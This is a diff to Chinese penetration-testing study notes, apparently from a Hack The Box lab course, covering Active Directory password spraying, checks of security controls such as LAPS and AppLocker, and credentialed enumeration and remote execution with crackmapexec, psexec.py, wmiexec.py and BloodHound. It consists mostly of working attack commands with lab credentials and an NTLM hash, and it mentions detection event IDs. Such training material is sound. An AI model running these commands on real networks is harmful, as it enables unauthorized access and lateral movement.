@@ -1225,7 +1225,7 @@ done
 
 **Note**：虽然密码喷洒对渗透测试人员或红队成员很有用，但粗心使用可能会造成相当大的伤害，例如锁定数百个生产帐户
 
-### 6.3.1　获取密码策略
+### 6.3.1 获取密码策略
 
 方式１：借助有效的域凭证
 
@@ -1275,7 +1275,7 @@ import-module .\PowerView.ps1
 Get-DomainPolicy
 ```
 
-### 6.3.2　制作目标用户列表
+### 6.3.2 制作目标用户列表
 
 ```
 enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
@@ -1322,7 +1322,7 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ```
 
-**实施Linux的密码喷射攻击：**
+### 6.3.3  实施Linux的密码喷射攻击：
 
 ```
 for u in $(cat valid_user.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
@@ -1338,7 +1338,7 @@ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123 #验证
 sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep + #--local-auth 标志将告诉该工具仅尝试在每台计算机上登录一次，从而消除任何帐户锁定的风险。
 ```
 
-**实施windows的密码喷射攻击：**
+### 6.3.4 实施windows的密码喷射攻击：
 
 ```powershell-session
 Import-Module .\DomainPasswordSpray.ps1
@@ -1346,6 +1346,106 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 ```
 
 在域控制器的安全日志中，事件 ID [4625 的许多实例：帐户在短时间内无法登录](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625)可能表示密码喷射攻击。事件 ID [4771：Kerberos 预身份验证失败 ](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771)，这可能表示 LDAP 密码喷射尝试。
+
+## 6.4 列举安全控制
+
+有些组织比其他组织有更严格的保护措施，而有些组织则没有在整个过程中平等地应用安全控制。可能有一些策略应用于某些计算机，这些策略可能会使我们的枚举更加困难，而这些策略不会应用于其他计算机。
+
+```
+Get-MpComputerStatus #检查defender的状态
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections #查看安全策略
+$ExecutionContext.SessionState.LanguageMode #查看语言模式，约束语言模式会锁定有效使用 PowerShell 所需的许多功能，例如阻止 COM 对象、仅允许已批准的 .NET 类型、基于 XAML 的工作流、PowerShell 类等。
+Find-LAPSDelegatedGroups #Microsoft 本地管理员密码解决方案 （LAPS） 用于随机化和轮换 Windows 主机上的本地管理员密码，并防止横向移动。我们可以列举哪些域用户可以读取为安装了 LAPS 的计算机设置的 LAPS 密码，以及哪些计算机未安装 LAPS。
+Find-AdmPwdExtendedRights
+Get-LAPSComputers
+```
+
+## 6.5 Linux凭证枚举
+
+### 6.5.1 crackmapexec
+
+```
+crackmapexec smb -h
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --loggedon-users
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'会写入/tmp/cme_spider_plus/<ip of host> JSON 文件。 
+```
+
+### 6.5.2 SMBMap
+
+```
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+```
+
+### 6.5.3 rpcclient
+
+```
+rpcclient -U "" -N 172.16.5.5
+rpcclient $> queryuser 0x457
+rpcclient $> enumdomusers
+```
+
+### 6.5.4 psexec.py
+
+Psexec.py 是 Sysinternals psexec 可执行文件的克隆，但其工作方式与原始可执行文件略有不同。该工具通过将随机命名的可执行文件上传到目标主机上的 `ADMIN$` 共享来创建远程服务。然后，它通过 `RPC` 和 `Windows Service Control Manager` .建立后，通信将通过命名管道进行，从而在受害者主机上提供交互式远程 shell 作为 `SYSTEM`。
+
+```
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125 #要使用 psexec.py 连接到主机，我们需要具有本地管理员权限的用户的凭证。
+```
+
+### 6.5.5 wmiexec.py
+
+Wmiexec.py 利用半交互式 shell，其中命令通过 [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) 执行。它不会在目标主机上删除任何文件或可执行文件，并且生成的日志比其他模块少。连接后，它以我们连接的本地管理员用户身份运行（对于寻找入侵的人来说，这可能比看到 SYSTEM 执行许多命令更不明显）。与其他工具相比，这是一种在主机上执行更隐蔽的方法，但仍可能被大多数现代防病毒和 EDR 系统捕获(如果警惕的防御者检查事件日志并查看事件 ID [4688：已创建新进程 ](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688))。我们将使用与 psexec.py 相同的帐户来访问主机。
+
+```
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
+```
+
+### 6.5.6 Windapsearch
+
+```shell-session
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+```
+
+### 6.5.7 Bloodhound.py
+
+```
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
